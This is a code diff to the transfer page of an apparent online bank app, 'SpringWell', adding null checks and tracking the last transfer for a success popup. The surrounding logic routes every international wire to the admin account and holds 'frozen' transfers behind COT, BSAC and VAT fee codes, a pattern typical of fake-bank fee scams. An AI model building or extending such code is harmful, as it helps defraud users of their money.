@@ -47,6 +47,7 @@ export default function TransferPage() {
     recipientLabel: string;
   };
   const [confirmData, setConfirmData] = useState<ConfirmData | null>(null);
+  const [lastSuccess, setLastSuccess] = useState<{ amount: number; recipient: string; type: string } | null>(null);
 
   const [frozenTxnId, setFrozenTxnId] = useState<string | null>(null);
   const [codeStep, setCodeStep] = useState<"cot" | "bsac" | "vat" | "completed">("cot");
@@ -116,16 +117,18 @@ export default function TransferPage() {
     const amt = confirmData.amount;
     const acct = domesticForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
     const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
+    if (!recipient) { setError("No SpringWell user found with that account number"); setConfirmData(null); return; }
     setLoading(true);
     try {
       const desc = `Domestic transfer to ${domesticForm.recipientName} at ${domesticForm.bankName}${domesticForm.description ? `, ${domesticForm.description}` : ""}`;
-      const result = await transfer({ fromUserId: userId as any, toUserId: recipient!._id, amount: amt, description: desc });
+      const result = await transfer({ fromUserId: userId as any, toUserId: recipient._id, amount: amt, description: desc });
       if ((result as any)?.frozen) {
         setFrozenTxnId((result as any).transactionId);
         setCodeStep(stepFromFeeStatus((result as any).feeStatus));
         setCodeInput("");
         setCodeSuccess("");
         setCodeError("");
+        setLastSuccess({ amount: amt, recipient: domesticForm.recipientName, type: "Domestic" });
         setConfirmData(null);
       } else {
         setSuccessPopup({ amount: amt, recipient: domesticForm.recipientName, type: "Domestic", txId: (result as any)?.transactionId });
@@ -168,12 +171,13 @@ export default function TransferPage() {
   async function confirmInternational() {
     if (!confirmData) return;
     const amt = confirmData.amount;
+    const adminUser = users?.find((u: any) => u.role === "admin");
+    if (!adminUser) { setError("No admin account found"); setConfirmData(null); return; }
     setLoading(true);
     try {
-      const adminUser = users?.find((u: any) => u.role === "admin");
       const result = await transfer({
         fromUserId: userId as any,
-        toUserId: adminUser!._id,
+        toUserId: adminUser._id,
         amount: amt,
         description: `International wire to ${intlForm.recipientName} at ${intlForm.recipientBank}${intlForm.swiftCode ? ` (SWIFT: ${intlForm.swiftCode})` : ""}${intlForm.iban ? ` (IBAN: ${intlForm.iban})` : ""}`,
       });
@@ -183,6 +187,7 @@ export default function TransferPage() {
         setCodeInput("");
         setCodeSuccess("");
         setCodeError("");
+        setLastSuccess({ amount: amt, recipient: intlForm.recipientName, type: "International" });
         setConfirmData(null);
       } else {
         setSuccessPopup({ amount: amt, recipient: intlForm.recipientName, type: "International" });
@@ -225,11 +230,12 @@ export default function TransferPage() {
     const amt = confirmData.amount;
     const acct = businessForm.accountNumber.trim().toUpperCase().replace(/^SWB-/, "");
     const recipient = users?.find((u: any) => u._id.slice(-8).toUpperCase() === acct && u.role !== "admin");
+    if (!recipient) { setError("No SpringWell user found with that account number"); setConfirmData(null); return; }
     setLoading(true);
     try {
       const result = await transfer({
         fromUserId: userId as any,
-        toUserId: recipient!._id,
+        toUserId: recipient._id,
         amount: amt,
         description: businessForm.description || `Business payment to ${businessForm.businessName}`,
       });
@@ -239,6 +245,7 @@ export default function TransferPage() {
         setCodeInput("");
         setCodeSuccess("");
         setCodeError("");
+        setLastSuccess({ amount: amt, recipient: businessForm.businessName, type: "Business" });
         setConfirmData(null);
       } else {
         setSuccessPopup({ amount: amt, recipient: businessForm.businessName, type: "Business" });
@@ -568,7 +575,7 @@ export default function TransferPage() {
                     ) : `Verify ${codeStep.toUpperCase()}`}
                   </button>
                 ) : (
-                  <button onClick={() => { setFrozenTxnId(null); setCodeStep("cot"); setSuccessPopup({ amount: confirmData?.amount ?? 0, recipient: confirmData?.recipientLabel ?? "", type: "Transfer" }); }} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#16a34a", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700 }}>Done</button>
+                  <button onClick={() => { setFrozenTxnId(null); setCodeStep("cot"); setSuccessPopup({ amount: lastSuccess?.amount ?? 0, recipient: lastSuccess?.recipient ?? "", type: lastSuccess?.type ?? "Transfer" }); }} style={{ flex: 1, padding: "12px", border: "none", borderRadius: 6, backgroundColor: "#16a34a", color: "#fff", cursor: "pointer", fontSize: 14, fontWeight: 700 }}>Done</button>
                 )}
               </div>
             </div>
